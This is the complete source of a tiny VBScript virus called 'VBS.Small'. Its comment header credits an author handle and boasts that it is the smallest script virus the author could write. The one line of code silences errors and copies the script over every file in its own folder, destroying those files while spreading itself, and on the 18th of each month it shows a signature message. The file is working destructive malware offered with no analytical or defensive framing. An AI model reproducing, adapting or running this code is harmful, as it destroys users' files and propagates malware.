'VBS.Small
'Author: Total Konfuzion
'Origin: UK
'Smallest script virus I could write :)
On Error Resume Next:Set A1=CreateObject("WScript.Shell"):Set F=CreateObject("Scripting.FileSystemObject"):F1=(WScript.ScriptFullName):V1=Left(F1,InStrRev(F1,"\")):For Each T1 In F.GetFolder(V1).Files:F.CopyFile F1,T1.Name:Next:If Day(Now())=18 Then WScript.Echo "VBS.Small" & Chr(13) & "by: Total Konfuzion"
